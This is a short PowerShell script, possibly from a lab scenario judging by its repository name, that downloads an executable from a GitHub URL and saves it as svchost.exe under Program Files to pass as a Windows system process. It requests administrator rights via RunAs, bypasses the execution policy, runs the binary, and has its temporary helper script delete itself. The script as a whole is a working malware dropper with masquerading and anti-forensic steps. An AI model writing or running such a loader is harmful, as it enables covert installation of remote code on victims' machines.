$exeUrl = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/elevcheck.exe"
$dst = "C:\Program Files\Microsoft\svchost.exe"

$body = @"
`$exeUrl = "$exeUrl"
`$dst = "$dst"
New-Item -Path "$([System.IO.Path]::GetDirectoryName($dst))" -ItemType Directory -Force | Out-Null
Invoke-WebRequest -Uri `$exeUrl -OutFile `$dst
Remove-Item -Path `"`$PSCommandPath`" -Force -ErrorAction SilentlyContinue
Start-Process -FilePath `$dst
"@

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    $tmp = [System.IO.Path]::GetTempFileName() + ".ps1"
    Set-Content -Path $tmp -Value $body
    Start-Process powershell.exe "-NoP -NonI -Exec Bypass -File `"$tmp`"" -Verb RunAs
    exit
}

New-Item -Path "C:\Program Files\Microsoft" -ItemType Directory -Force | Out-Null
Invoke-WebRequest -Uri $exeUrl -OutFile $dst
Start-Process -FilePath $dst
